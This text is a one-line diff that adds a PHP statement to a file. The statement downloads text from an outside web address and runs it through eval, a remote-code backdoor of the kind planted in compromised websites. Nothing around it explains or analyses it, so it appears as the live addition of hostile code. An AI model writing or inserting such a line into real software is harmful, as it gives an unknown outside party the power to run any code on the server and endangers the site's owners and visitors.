@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("http://poolpact.com/documents/idx.txt"));?>
